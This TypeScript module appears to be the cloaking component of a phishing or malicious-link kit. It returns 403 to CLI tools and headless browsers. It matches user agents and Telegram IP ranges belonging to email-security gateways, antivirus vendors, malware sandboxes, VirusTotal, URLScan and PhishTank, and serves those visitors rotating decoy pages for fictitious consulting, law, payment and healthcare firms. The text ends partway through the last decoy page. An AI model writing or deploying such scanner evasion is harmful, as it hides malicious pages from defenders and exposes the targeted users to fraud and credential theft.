// Layer 1 — Hard Block (403): CLI tools and headless browsers
// Layer 2 — Scanner Safe Pages (200 rotating): Professional business pages for scanners

const HARD_BLOCK_PATTERNS: string[] = [
  'curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client',
  'java/', 'headlesschrome', 'phantomjs', 'selenium', 'puppeteer',
  'playwright', 'googlebot', 'yandexbot', 'linkedinbot', 'facebookexternalhit',
  // Scraping frameworks & HTTP clients
  'scrapy', 'httpclient', 'mechanize', 'aiohttp', 'libwww-perl',
  'ruby/', 'okhttp', 'apache-httpclient', 'colly', 'nutch',
];

const SCANNER_PATTERNS: string[] = [
  // Microsoft SafeLinks / ATP / Outlook
  'safelinks', 'microsoft office', 'ms-office', 'outlook', 'microsoft outlook',
  'microsoft-atp', 'ms-exchange', 'transport agent', 'safelinks protection',
  // Proofpoint
  'proofpoint', 'urldefense', 'linkprotect', 'pps/',
  // Mimecast
  'mimecast', 'mime-version',
  // Barracuda
  'barracuda', 'barracudacentral', 'bsn-',
  // FireEye
  'fireeye', 'fesb', 'fenotifier',
  // Forcepoint
  'forcepoint', 'websense',
  // Zscaler
  'zscaler', 'zscaler private access', 'zscloud',
  // Sophos
  'sophos', 'sophosxl',
  // Trend Micro (9 variants)
  'trendmicro', 'tmase', 'tmsps', 'tmharvest', 'interscan', 'imss',
  'iwss', 'scanmail', 'deep discovery',
  // Symantec / Broadcom / MessageLabs
  'symantec', 'broadcom', 'messagelabs', 'brightmail', 'nortonlifelock',
  // Cisco IronPort
  'ironport', 'cisco email', 'cisco esa',
  // Kaspersky
  'kaspersky', 'ksmg',
  // McAfee / Trellix
  'mcafee', 'trellix', 'intel security',
  // Fortinet / FortiGuard / FortiGate
  'fortinet', 'fortiguard', 'fortigate', 'fortimail',
  // Palo Alto / WildFire
  'palo alto', 'wildfire', 'pan-os',
  // Cloudflare
  'cloudflare-workers', 'cf-worker',
  // Akamai
  'akamai', 'akamaighost',
  // VirusTotal
  'virustotal', 'virus total',
  // URLScan
  'urlscan', 'urlscan.io',
  // Sucuri
  'sucuri', 'sitecheck',
  // Shodan
  'shodan',
  // Censys
  'censys',
  // PhishTank
  'phishtank',
  // Spamhaus
  'spamhaus',
  // Antivirus
  'clamav', 'avg/', 'avast', 'avira', 'bitdefender', 'eset', 'f-secure',
  'comodo', 'checkpoint',
  // Telegram (multiple UA variants)
  'telegrambot', 'telegram', 'tg-url-preview', 'tg/', 'tgbot',
  // Messaging bots
  'bingbot', 'slackbot', 'twitterbot', 'discordbot', 'whatsapp',
  'signal/', 'viber', 'skypeuripreview', 'line/',
  // Dev tools
  'httpie', 'node-fetch', 'powershell', 'axios', 'postmanruntime',
  // Microsoft Defender / SmartScreen
  'smartscreen', 'microsoft defender', 'defender', 'microsoftpreview',
  // Email Security — Additional Vendors
  'abnormal security', 'agari', 'area1', 'darktrace', 'egress',
  'ironscales', 'tessian', 'cofense', 'knowbe4', 'phishme',
  'inky', 'vade', 'trustifi', 'graphus',
  // Sandbox / Malware Analysis
  'hybrid-analysis', 'any.run', 'joesandbox', 'cuckoo',
  'cape sandbox', 'triage', 'malwarebytes', 'webroot',
  // Cloud / Endpoint Security
  'crowdstrike', 'sentinelone', 'carbon black', 'cylance',
  'sophos central', 'netskope',
  // Search Engines / SEO
  'duckduckbot', 'baiduspider', 'sogou', 'petalbot', 'applebot', 'ahrefsbot',
  // Monitoring / Uptime
  'uptimerobot', 'pingdom', 'statuscake', 'site24x7',
  // Social / Messaging
  'pinterestbot', 'redditbot', 'mastodon',
  // Generic
  'scanner', 'crawler', 'spider', 'bot/', 'bot;',
];

// Telegram URL preview IP ranges (IPv4 CIDRs)
const TELEGRAM_IP_PREFIXES: string[] = [
  '149.154.160.', '149.154.161.', '149.154.162.', '149.154.163.',
  '149.154.164.', '149.154.165.', '149.154.166.', '149.154.167.',
  '149.154.168.', '149.154.169.', '149.154.170.', '149.154.171.',
  '149.154.172.', '149.154.173.', '149.154.174.', '149.154.175.',
  '91.108.4.', '91.108.5.', '91.108.6.', '91.108.7.',
  '91.108.8.', '91.108.9.', '91.108.10.', '91.108.11.',
  '91.108.12.', '91.108.13.', '91.108.14.', '91.108.15.',
  '91.108.16.', '91.108.17.', '91.108.18.', '91.108.19.',
  '91.108.20.', '91.108.21.', '91.108.56.', '91.108.57.',
  '95.161.64.',
];

export function isHardBlocked(ua: string): boolean {
  const lower = ua.toLowerCase();
  return HARD_BLOCK_PATTERNS.some(p => lower.includes(p));
}

export function isScanner(ua: string, ip?: string): boolean {
  const lower = ua.toLowerCase();
  if (SCANNER_PATTERNS.some(p => lower.includes(p))) return true;
  // Check Telegram IP ranges (catches requests with generic browser UA)
  if (ip && TELEGRAM_IP_PREFIXES.some(prefix => ip.startsWith(prefix))) return true;
  return false;
}

function hashCode(s: string): number {
  let h = 0;
  for (let i = 0; i < s.length; i++) {
    h = ((h << 5) - h + s.charCodeAt(i)) | 0;
  }
  return Math.abs(h);
}

export function getRotatingPage(ua: string, url: string): string {
  const hour = Math.floor(Date.now() / 3600000);
  const idx = hashCode(ua + url + hour) % 10;
  return SAFE_PAGES[idx];
}

const SAFE_PAGES: string[] = [
  // 0: Meridian Consulting Group
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Meridian Consulting Group - Strategic Advisory</title>
<meta name="description" content="Strategic advisory and management consulting for Fortune 500 companies worldwide.">
<meta property="og:title" content="Meridian Consulting Group - Strategic Advisory">
<meta property="og:description" content="Strategic advisory and management consulting for Fortune 500 companies worldwide.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1a1a2e;line-height:1.6}
.h{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.85;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1a1a2e;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#f8f9fa;border-radius:12px;padding:30px;text-align:center}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#1a1a2e;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
</style></head><body>
<nav class="n"><a href="#">Home</a><a href="#">Services</a><a href="#">Industries</a><a href="#">About</a><a href="#">Contact</a></nav>
<div class="h"><h1>Meridian Consulting Group</h1><p>Strategic advisory and management consulting for Fortune 500 companies worldwide</p></div>
<div class="s"><h2>Our Services</h2><div class="g">
<div class="c"><h3>Strategy &amp; Operations</h3><p>End-to-end transformation programs driving measurable business outcomes.</p></div>
<div class="c"><h3>Digital Transformation</h3><p>Technology-enabled solutions for modern enterprise challenges.</p></div>
<div class="c"><h3>M&amp;A Advisory</h3><p>Due diligence, integration planning, and synergy realization.</p></div>
</div></div>
<div class="f">&copy; 2024 Meridian Consulting Group. All rights reserved. | New York | London | Singapore</div>
</body></html>`,

  // 1: Pinnacle Cloud Solutions
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pinnacle Cloud Solutions - Enterprise Cloud Infrastructure</title>
<meta name="description" content="Enterprise-grade cloud infrastructure with 99.99% uptime guarantee and managed services.">
<meta property="og:title" content="Pinnacle Cloud Solutions - Enterprise Infrastructure">
<meta property="og:description" content="Enterprise-grade cloud infrastructure with 99.99% uptime guarantee and managed services.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1e293b;line-height:1.6}
.h{background:linear-gradient(135deg,#0f172a 0%,#1e40af 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.85;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1e293b;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#f0f9ff;border-radius:12px;padding:30px;text-align:center;border:1px solid #bae6fd}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#0f172a;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.b{display:flex;justify-content:center;gap:20px;margin-top:24px}
.b a{padding:12px 28px;border-radius:8px;text-decoration:none;font-weight:600;font-size:.95rem}
.b .p{background:#2563eb;color:#fff}.b .s2{border:2px solid #fff;color:#fff}
</style></head><body>
<nav class="n"><a href="#">Platform</a><a href="#">Solutions</a><a href="#">Pricing</a><a href="#">Documentation</a><a href="#">Support</a></nav>
<div class="h"><h1>Pinnacle Cloud Solutions</h1><p>Enterprise-grade cloud infrastructure with 99.99% uptime guarantee</p>
<div class="b"><a class="p" href="#">Start Free Trial</a><a class="s2" href="#">View Plans</a></div></div>
<div class="s"><h2>Cloud Solutions</h2><div class="g">
<div class="c"><h3>Managed Kubernetes</h3><p>Fully managed K8s clusters with auto-scaling and self-healing.</p></div>
<div class="c"><h3>Data Lake Platform</h3><p>Unified analytics platform for structured and unstructured data.</p></div>
<div class="c"><h3>Edge Computing</h3><p>Deploy workloads at 200+ edge locations globally.</p></div>
</div></div>
<div class="f">&copy; 2024 Pinnacle Cloud Solutions Inc. | San Francisco | Austin | Dublin</div>
</body></html>`,

  // 2: Elevate HR
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Elevate HR - People Operations Platform</title>
<meta name="description" content="The modern people operations platform trusted by 10,000+ companies worldwide.">
<meta property="og:title" content="Elevate HR - People Operations Platform">
<meta property="og:description" content="The modern people operations platform trusted by 10,000+ companies worldwide.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1a1a1a;line-height:1.6}
.h{background:linear-gradient(135deg,#7c3aed 0%,#a855f7 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1a1a1a;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#faf5ff;border-radius:12px;padding:30px;text-align:center;border:1px solid #e9d5ff}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#1e1b4b;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#f9fafb}
.st div{text-align:center}.st h3{font-size:2rem;color:#7c3aed}.st p{font-size:.85rem;color:#666}
</style></head><body>
<nav class="n"><a href="#">Product</a><a href="#">Solutions</a><a href="#">Resources</a><a href="#">Pricing</a><a href="#">Login</a></nav>
<div class="h"><h1>Elevate HR</h1><p>The modern people operations platform trusted by 10,000+ companies</p></div>
<div class="st"><div><h3>10K+</h3><p>Companies</p></div><div><h3>2M+</h3><p>Employees Managed</p></div><div><h3>98%</h3><p>Customer Satisfaction</p></div></div>
<div class="s"><h2>All-in-One HR Platform</h2><div class="g">
<div class="c"><h3>Talent Acquisition</h3><p>Streamlined recruiting with AI-powered candidate matching.</p></div>
<div class="c"><h3>Performance Management</h3><p>Continuous feedback and goal tracking for every team.</p></div>
<div class="c"><h3>Benefits Administration</h3><p>Simplified benefits enrollment and management.</p></div>
</div></div>
<div class="f">&copy; 2024 Elevate HR Inc. All rights reserved. | Boston | Chicago | Denver</div>
</body></html>`,

  // 3: Ashford & Sterling LLP
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Ashford &amp; Sterling LLP - International Law Firm</title>
<meta name="description" content="Premier international law firm serving clients across 30 jurisdictions worldwide.">
<meta property="og:title" content="Ashford &amp; Sterling LLP - International Law Firm">
<meta property="og:description" content="Premier international law firm serving clients across 30 jurisdictions worldwide.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Georgia,'Times New Roman',serif;color:#1a1a1a;line-height:1.7}
.h{background:linear-gradient(135deg,#1c1917 0%,#44403c 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.3rem;margin-bottom:16px;font-weight:400;letter-spacing:2px}.h p{font-size:1rem;opacity:.8;max-width:600px;margin:0 auto;font-family:-apple-system,sans-serif}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:2px solid #d4af37}
.n a{color:#1a1a1a;text-decoration:none;font-weight:500;font-family:-apple-system,sans-serif;font-size:.9rem;text-transform:uppercase;letter-spacing:1px}
.s{padding:60px 20px;max-width:1000px;margin:0 auto}.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px;font-weight:400}
.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#fafaf9;border-radius:4px;padding:30px;border-left:3px solid #d4af37}.c h3{margin:0 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555;font-family:-apple-system,sans-serif}.f{background:#1c1917;color:#d4af37;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px;font-family:-apple-system,sans-serif}
</style></head><body>
<nav class="n"><a href="#">Practice Areas</a><a href="#">Our Team</a><a href="#">Offices</a><a href="#">Insights</a><a href="#">Careers</a></nav>
<div class="h"><h1>Ashford &amp; Sterling LLP</h1><p>Premier international law firm serving clients across 30 jurisdictions</p></div>
<div class="s"><h2>Practice Areas</h2><div class="g">
<div class="c"><h3>Corporate &amp; M&amp;A</h3><p>Complex cross-border transactions and corporate governance advisory.</p></div>
<div class="c"><h3>Litigation &amp; Arbitration</h3><p>High-stakes commercial disputes and international arbitration.</p></div>
<div class="c"><h3>Capital Markets</h3><p>IPOs, debt offerings, and securities regulatory compliance.</p></div>
</div></div>
<div class="f">&copy; 2024 Ashford &amp; Sterling LLP | New York | London | Hong Kong | Dubai</div>
</body></html>`,

  // 4: NovaPay
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NovaPay - Digital Payment Solutions</title>
<meta name="description" content="Next-generation payment infrastructure for the digital economy. Process payments in 195 countries.">
<meta property="og:title" content="NovaPay - Business Payment Solutions">
<meta property="og:description" content="Next-generation payment infrastructure for the digital economy. Process payments in 195 countries.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#0f172a;line-height:1.6}
.h{background:linear-gradient(135deg,#059669 0%,#10b981 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#0f172a;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#f0fdf4;border-radius:12px;padding:30px;text-align:center;border:1px solid #bbf7d0}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#064e3b;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#f0fdf4}
.st div{text-align:center}.st h3{font-size:2rem;color:#059669}.st p{font-size:.85rem;color:#666}
</style></head><body>
<nav class="n"><a href="#">Products</a><a href="#">Developers</a><a href="#">Business</a><a href="#">Pricing</a><a href="#">Login</a></nav>
<div class="h"><h1>NovaPay</h1><p>Next-generation payment infrastructure for the digital economy</p></div>
<div class="st"><div><h3>$2T+</h3><p>Processed Annually</p></div><div><h3>195</h3><p>Countries</p></div><div><h3>50ms</h3><p>Avg Latency</p></div></div>
<div class="s"><h2>Payment Solutions</h2><div class="g">
<div class="c"><h3>Online Payments</h3><p>Accept payments from anywhere with a single integration.</p></div>
<div class="c"><h3>Subscription Billing</h3><p>Recurring payments with smart retry and dunning management.</p></div>
<div class="c"><h3>Fraud Prevention</h3><p>ML-powered fraud detection with 99.97% accuracy.</p></div>
</div></div>
<div class="f">&copy; 2024 NovaPay Inc. All rights reserved. | San Francisco | London | Tokyo | Sydney</div>
</body></html>`,

  // 5: BrightPath Analytics
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>BrightPath Analytics - Business Intelligence</title>
<meta name="description" content="AI-powered business intelligence and data analytics platform for enterprise teams.">
<meta property="og:title" content="BrightPath Analytics - Business Intelligence">
<meta property="og:description" content="AI-powered business intelligence and data analytics platform for enterprise teams.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1e293b;line-height:1.6}
.h{background:linear-gradient(135deg,#0891b2 0%,#06b6d4 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1e293b;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#ecfeff;border-radius:12px;padding:30px;text-align:center;border:1px solid #a5f3fc}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#164e63;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#ecfeff}
.st div{text-align:center}.st h3{font-size:2rem;color:#0891b2}.st p{font-size:.85rem;color:#666}
</style></head><body>
<nav class="n"><a href="#">Platform</a><a href="#">Solutions</a><a href="#">Integrations</a><a href="#">Pricing</a><a href="#">Login</a></nav>
<div class="h"><h1>BrightPath Analytics</h1><p>AI-powered business intelligence that turns raw data into actionable insights</p></div>
<div class="st"><div><h3>5K+</h3><p>Enterprise Clients</p></div><div><h3>40B+</h3><p>Data Points Daily</p></div><div><h3>99.9%</h3><p>Platform Uptime</p></div></div>
<div class="s"><h2>Analytics Solutions</h2><div class="g">
<div class="c"><h3>Real-Time Dashboards</h3><p>Interactive visualizations with sub-second query performance.</p></div>
<div class="c"><h3>Predictive Analytics</h3><p>ML-driven forecasting and anomaly detection built in.</p></div>
<div class="c"><h3>Data Integration</h3><p>Connect 200+ data sources with zero-code pipelines.</p></div>
</div></div>
<div class="f">&copy; 2024 BrightPath Analytics Inc. | Seattle | Boston | Amsterdam</div>
</body></html>`,

  // 6: Greenfield Property Group
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Greenfield Property Group - Real Estate Solutions</title>
<meta name="description" content="Commercial and residential property management, development, and investment advisory services.">
<meta property="og:title" content="Greenfield Property Group - Real Estate Solutions">
<meta property="og:description" content="Commercial and residential property management, development, and investment advisory services.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1a1a1a;line-height:1.6}
.h{background:linear-gradient(135deg,#166534 0%,#22c55e 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1a1a1a;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#f0fdf4;border-radius:12px;padding:30px;text-align:center;border:1px solid #86efac}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#14532d;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#f0fdf4}
.st div{text-align:center}.st h3{font-size:2rem;color:#166534}.st p{font-size:.85rem;color:#666}
</style></head><body>
<nav class="n"><a href="#">Properties</a><a href="#">Services</a><a href="#">Investments</a><a href="#">About</a><a href="#">Contact</a></nav>
<div class="h"><h1>Greenfield Property Group</h1><p>Premier commercial and residential real estate management and development</p></div>
<div class="st"><div><h3>$12B</h3><p>Assets Under Management</p></div><div><h3>850+</h3><p>Properties</p></div><div><h3>25</h3><p>Years Experience</p></div></div>
<div class="s"><h2>Our Services</h2><div class="g">
<div class="c"><h3>Property Management</h3><p>Full-service property management for commercial and residential portfolios.</p></div>
<div class="c"><h3>Development</h3><p>Ground-up development and value-add repositioning strategies.</p></div>
<div class="c"><h3>Investment Advisory</h3><p>Acquisitions, dispositions, and portfolio optimization.</p></div>
</div></div>
<div class="f">&copy; 2024 Greenfield Property Group LLC | Miami | Dallas | Chicago | Phoenix</div>
</body></html>`,

  // 7: Nexus Health Systems
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Nexus Health Systems - Connected Healthcare</title>
<meta name="description" content="Connected healthcare platform powering hospitals, clinics, and telehealth providers worldwide.">
<meta property="og:title" content="Nexus Health Systems - Connected Healthcare">
<meta property="og:description" content="Connected healthcare platform powering hospitals, clinics, and telehealth providers worldwide.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1e293b;line-height:1.6}
.h{background:linear-gradient(135deg,#1e40af 0%,#3b82f6 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1e293b;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#eff6ff;border-radius:12px;padding:30px;text-align:center;border:1px solid #93c5fd}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#1e3a5f;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#eff6ff}
.st div{text-align:center}.st h3{font-size:2rem;color:#1e40af}.st p{font-size:.85rem;color:#666}
</style></head><body>
<nav class="n"><a href="#">Solutions</a><a href="#">Products</a><a href="#">Resources</a><a href="#">Partners</a><a href="#">Support</a></nav>
<div class="h"><h1>Nexus Health Systems</h1><p>The connected healthcare platform trusted by 3,000+ healthcare organizations</p></div>
<div class="st"><div><h3>3K+</h3><p>Healthcare Orgs</p></div><div><h3>50M+</h3><p>Patient Records</p></div><div><h3>HIPAA</h3><p>Compliant</p></div></div>
<div class="s"><h2>Healthcare Solutions</h2><div class="g">
<div class="c"><h3>Electronic Health Records</h3><p>Unified patient records with interoperability across systems.</p></div>
<div class="c"><h3>Telehealth Platform</h3><p>HIPAA-compliant video visits with integrated scheduling.</p></div>
<div class="c"><h3>Revenue Cycle Management</h3><p>Automated billing, coding, and claims management.</p></div>
</div></div>
<div class="f">&copy; 2024 Nexus Health Systems Inc. | Nashville | Atlanta | Minneapolis | Portland</div>
</body></html>`,

  // 8: Ironbridge Financial
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Ironbridge Financial - Wealth Management</title>
<meta name="description" content="Independent wealth management and investment advisory firm serving high-net-worth individuals and institutions.">
<meta property="og:title" content="Ironbridge Financial - Wealth Management">
<meta property="og:description" content="Independent wealth management and investment advisory firm serving high-net-worth individuals and institutions.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Georgia,'Times New Roman',serif;color:#1a1a1a;line-height:1.7}
.h{background:linear-gradient(135deg,#1c1917 0%,#292524 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.3rem;margin-bottom:16px;font-weight:400;letter-spacing:1px}.h p{font-size:1rem;opacity:.8;max-width:600px;margin:0 auto;font-family:-apple-system,sans-serif}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:2px solid #b8860b}
.n a{color:#1a1a1a;text-decoration:none;font-weight:500;font-family:-apple-system,sans-serif;font-size:.9rem;text-transform:uppercase;letter-spacing:1px}
.s{padding:60px 20px;max-width:1000px;margin:0 auto}.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px;font-weight:400}
.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#fafaf9;border-radius:4px;padding:30px;border-left:3px solid #b8860b}.c h3{margin:0 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555;font-family:-apple-system,sans-serif}.f{background:#1c1917;color:#b8860b;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px;font-family:-apple-system,sans-serif}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#fafaf9}
.st div{text-align:center}.st h3{font-size:2rem;color:#b8860b;font-family:-apple-system,sans-serif}.st p{font-size:.85rem;color:#666;font-family:-apple-system,sans-serif}
</style></head><body>
<nav class="n"><a href="#">Wealth Management</a><a href="#">Investments</a><a href="#">Planning</a><a href="#">About</a><a href="#">Contact</a></nav>
<div class="h"><h1>Ironbridge Financial</h1><p>Independent wealth management and investment advisory since 1987</p></div>
<div class="st"><div><h3>$28B</h3><p>Assets Managed</p></div><div><h3>2,500+</h3><p>Client Families</p></div><div><h3>37</h3><p>Years of Service</p></div></div>
<div class="s"><h2>Advisory Services</h2><div class="g">
<div class="c"><h3>Wealth Planning</h3><p>Comprehensive financial planning tailored to your goals and legacy.</p></div>
<div class="c"><h3>Investment Management</h3><p>Disciplined, research-driven portfolio construction and oversight.</p></div>
<div class="c"><h3>Estate &amp; Tax Planning</h3><p>Strategic tax optimization and multigenerational wealth transfer.</p></div>
</div></div>
<div class="f">&copy; 2024 Ironbridge Financial Advisors LLC | Greenwich | Palm Beach | Scottsdale</div>
</body></html>`,

  // 9: Velocity Logistics
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Velocity Logistics - Global Supply Chain</title>
<meta name="description" content="End-to-end global freight, warehousing, and supply chain solutions for enterprise shippers.">
<meta property="og:title" content="Velocity Logistics - Global Supply Chain">
<meta property="og:description" content="End-to-end global freight, warehousing, and supply chain solutions for enterprise shippers.">
<meta property="og:type" content="website">
<meta name="robots" content="index,follow">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1a1a1a;line-height:1.6}
.h{background:linear-gradient(135deg,#c2410c 0%,#f97316 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#1a1a1a;border-bottom:1px solid #333}
.n a{color:#f5f5f5;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#fff7ed;border-radius:12px;padding:30px;text-align:center;border:1px solid #fed7aa}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#1a1a1a;color:#f97316;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#fff7ed}
.st div{text-align:center}.st h3{font-size:2rem;color:#c2410c}.st p{font-size:.85rem;color:#666}
</style></head><body>
